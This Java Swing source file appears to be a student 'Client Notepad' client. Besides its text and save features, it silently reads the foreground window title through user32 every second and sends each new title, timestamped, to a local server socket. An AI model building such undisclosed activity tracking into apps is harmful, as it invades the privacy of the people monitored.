
import java.awt.Color;
import java.awt.Font;
import java.awt.Toolkit;
import java.net.*;
import java.io.*;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.Library;
import com.sun.jna.ptr.IntByReference;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;


public class ClientSideForm extends javax.swing.JFrame {

    static Socket s;
    static DataInputStream din;
    static DataOutputStream dout;
    static String ip;
    static String publicIp;
    public ClientSideForm() {
        initComponents();
        this.getContentPane().setBackground(new Color(180, 223, 233));
    }
    
    public interface User32 extends Library {
        User32 INSTANCE = (User32) Native.load("user32", User32.class);

        HWND GetForegroundWindow();
        int GetWindowTextA(HWND hWnd, byte[] lpString, int nMaxCount);
    }
    
    class HandleClient extends Thread{
        ClientSideForm c;
        public HandleClient(ClientSideForm c){
            this.c=c;
        }
        public void run(){
            try{
                //s=new Socket(InetAddress.getByName("127.0.0.1"),ClientHome.portNumber,InetAddress.getByName(ip),ClientHome.portNumber);
                s = new Socket("localhost", 5001);
                
                din=new DataInputStream(s.getInputStream());
                dout=new DataOutputStream(s.getOutputStream());
                
                String previousWindowTitle = "";  
       
                while (true) {
                    String currentWindowTitle = getActiveWindowTitle(); 

                    if (!currentWindowTitle.equals(previousWindowTitle) && !currentWindowTitle.isEmpty()) {
                        previousWindowTitle = currentWindowTitle;
                        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                        String currentTime = dtf.format(LocalDateTime.now());
                        dout.writeUTF("Time: " + currentTime);
                        dout.writeUTF(currentWindowTitle);
                        System.out.println("Chuyển cửa sổ: " + currentWindowTitle);
                    }
                    Thread.sleep(1000);
                }
 
            }catch(Exception e){
                JOptionPane.showMessageDialog(null, "Server is not online, Please Try again", "Error in Connection", JOptionPane.ERROR_MESSAGE);
                c.setVisible(false);
                new Login().setVisible(true);
            }
        }

        
        private String getActiveWindowTitle() {
            byte[] windowText = new byte[512];
            HWND hwnd = User32.INSTANCE.GetForegroundWindow();
            User32.INSTANCE.GetWindowTextA(hwnd, windowText, 512);
            return Native.toString(windowText);
        }
    }
    public void go(){
        this.setVisible(true);
        //ip=ClientHome.ip;
        publicIp="103.204.166.235";
        //textMainLabel.setText(ClientHome.name);
        new HandleClient(this).start();
    }
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">                          
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        msg_area = new javax.swing.JTextArea();
        msg_exit = new javax.swing.JButton();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        fontSlider = new javax.swing.JSlider();
        jButton1 = new javax.swing.JButton();
        jScrollPane2 = new javax.swing.JScrollPane();
        textStatus = new javax.swing.JTextArea();
        textQuery = new javax.swing.JTextField();
        jButton2 = new javax.swing.JButton();
        textStatus2 = new javax.swing.JLabel();
        jButton3 = new javax.swing.JButton();
        jButton4 = new javax.swing.JButton();
        textMainLabel = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setBackground(new java.awt.Color(0, 255, 204));
        addContainerListener(new java.awt.event.ContainerAdapter() {
            public void componentAdded(java.awt.event.ContainerEvent evt) {
                formComponentAdded(evt);
            }
        });

        msg_area.setEditable(false);
        msg_area.setColumns(20);
        msg_area.setFont(new java.awt.Font("Times New Roman", 0, 18)); // NOI18N
        msg_area.setRows(5);
        msg_area.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));
        msg_area.setDoubleBuffered(true);
        msg_area.setDragEnabled(true);
        msg_area.setSelectedTextColor(new java.awt.Color(153, 255, 51));
        jScrollPane1.setViewportView(msg_area);

        msg_exit.setBackground(new java.awt.Color(255, 0, 0));
        msg_exit.setText("Exit");
        msg_exit.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                msg_exitActionPerformed(evt);
            }
        });

        jLabel1.setFont(new java.awt.Font("Times New Roman", 1, 24)); // NOI18N
        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel1.setText("Client Notepad");
        jLabel1.setBorder(new javax.swing.border.MatteBorder(null));

        jLabel2.setFont(new java.awt.Font("Tahoma", 0, 16)); // NOI18N
        jLabel2.setText("Font Size");

        fontSlider.setFont(new java.awt.Font("Times New Roman", 0, 13)); // NOI18N
        fontSlider.setMaximum(80);
        fontSlider.setMinimum(10);
        fontSlider.setValue(20);
        fontSlider.addPropertyChangeListener(new java.beans.PropertyChangeListener() {
            public void propertyChange(java.beans.PropertyChangeEvent evt) {
                fontSliderPropertyChange(evt);
            }
        });

        jButton1.setText("Set");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        textStatus.setEditable(false);
        textStatus.setColumns(20);
        textStatus.setRows(5);
        jScrollPane2.setViewportView(textStatus);

        textQuery.setToolTipText("Write Query Here");
        textQuery.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                textQueryActionPerformed(evt);
            }
        });

        jButton2.setText("Send Query");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        textStatus2.setFont(new java.awt.Font("Times New Roman", 1, 24)); // NOI18N
        textStatus2.setForeground(new java.awt.Color(0, 204, 0));
        textStatus2.setText("Connected");
        textStatus2.setBorder(javax.swing.BorderFactory.createCompoundBorder());

        jButton3.setText("Save as Text File");
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });

        jButton4.setText("Send mail");
        jButton4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton4ActionPerformed(evt);
            }
        });

        textMainLabel.setBorder(javax.swing.BorderFactory.createTitledBorder("Connected as"));

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGap(18, 18, 18)
                        .addComponent(textMainLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 284, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(textStatus2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addGap(18, 18, 18)
                                .addComponent(jButton4, javax.swing.GroupLayout.PREFERRED_SIZE, 196, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(18, 18, 18)
                                .addComponent(jButton3, javax.swing.GroupLayout.PREFERRED_SIZE, 149, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addComponent(jScrollPane1)
                            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                                .addComponent(jLabel2, javax.swing.GroupLayout.DEFAULT_SIZE, 299, Short.MAX_VALUE)
                                .addGap(18, 18, 18)
                                .addComponent(fontSlider, javax.swing.GroupLayout.DEFAULT_SIZE, 435, Short.MAX_VALUE)
                                .addGap(18, 18, 18)
                                .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 130, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addGap(18, 18, 18)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(msg_exit, javax.swing.GroupLayout.PREFERRED_SIZE, 284, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                                .addComponent(jScrollPane2, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 284, Short.MAX_VALUE)
                                .addComponent(textQuery, javax.swing.GroupLayout.Alignment.LEADING)
                                .addComponent(jButton2, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 44, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(textMainLabel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGap(5, 5, 5)))
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(fontSlider, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jScrollPane1))
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 424, Short.MAX_VALUE)
                        .addGap(18, 18, 18)
                        .addComponent(textQuery, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 36, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(msg_exit, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(jButton3, javax.swing.GroupLayout.PREFERRED_SIZE, 39, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(jButton4, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(textStatus2, javax.swing.GroupLayout.PREFERRED_SIZE, 39, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap())
        );

        pack();
    }// </editor-fold>                        

    private void msg_exitActionPerformed(java.awt.event.ActionEvent evt) {                                         
        if(JOptionPane.showConfirmDialog(null,"Do you want to exit?", "Warning", JOptionPane.YES_NO_OPTION, JOptionPane.ERROR_MESSAGE)==0){
            try {
                // TODO add your handling code here:
                dout.writeUTF("Exit");
            } catch (IOException ex) {
                Logger.getLogger(ClientSideForm.class.getName()).log(Level.SEVERE, null, ex);
            }
            System.exit(0);
        }
        
    }                                        

    private void formComponentAdded(java.awt.event.ContainerEvent evt) {                                    
        // TODO add your handling code here:
    }                                   

    private void fontSliderPropertyChange(java.beans.PropertyChangeEvent evt) {                                          
        // TODO add your handling code here:
    }                                         

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {                                         
        // TODO add your handling code here:
        int size=fontSlider.getValue();
        msg_area.setFont(new Font("Times New Roman",Font.PLAIN,size));
    }                                        

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {                                         
        // TODO add your handling code here:
        String str=textQuery.getText();
        textQuery.setText(null);
        try {
            dout.writeUTF(str);
            textStatus.setText(textStatus.getText()+"\n You :- "+str);
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, "Could not send ");
        }
    }                                        

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {                                         
        // TODO add your handling code here:
        JFileChooser chooser=new JFileChooser();
        chooser.setCurrentDirectory(new java.io.File("."));
        chooser.setDialogTitle("Select Directory to Save File");
        chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
        chooser.setAcceptAllFileFilterUsed(false);
        String fileName=JOptionPane.showInputDialog("Enter File Name (With Extension) ");

        if (chooser.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) { 
                String str=chooser.getSelectedFile().getAbsolutePath();
            try {
                FileWriter fout;
                fout = new FileWriter(str+"/"+fileName);
                PrintWriter p=new PrintWriter(fout);
                String words[]=msg_area.getText().split("\n");
                
                for(String word : words){
                    p.println(word);
                }
                p.close();
                fout.close();
                JOptionPane.showMessageDialog(null, "File Successfully written");
            } catch (FileNotFoundException ex) {
                Logger.getLogger(ClientSideForm.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex) {
                Logger.getLogger(ClientSideForm.class.getName()).log(Level.SEVERE, null, ex);
            }
              }
            else {
              JOptionPane.showMessageDialog(null,"No Selection ");
              }
    }                                        

    private void jButton4ActionPerformed(java.awt.event.ActionEvent evt) {                                         
 
    }                                        

    private void textQueryActionPerformed(java.awt.event.ActionEvent evt) {                                          
        // TODO add your handling code here:
    }                                         

    public static void main(String args[]) {
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(ClientSideForm.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(ClientSideForm.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(ClientSideForm.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(ClientSideForm.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new ClientSideForm().go();
            }
        });       
    }               
    static javax.swing.JSlider fontSlider;
    static javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    static javax.swing.JButton jButton3;
    private javax.swing.JButton jButton4;
    private javax.swing.JLabel jLabel1;
    static javax.swing.JLabel jLabel2;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private static javax.swing.JTextArea msg_area;
    private javax.swing.JButton msg_exit;
    private javax.swing.JLabel textMainLabel;
    private javax.swing.JTextField textQuery;
    private javax.swing.JTextArea textStatus;
    static javax.swing.JLabel textStatus2;                
}
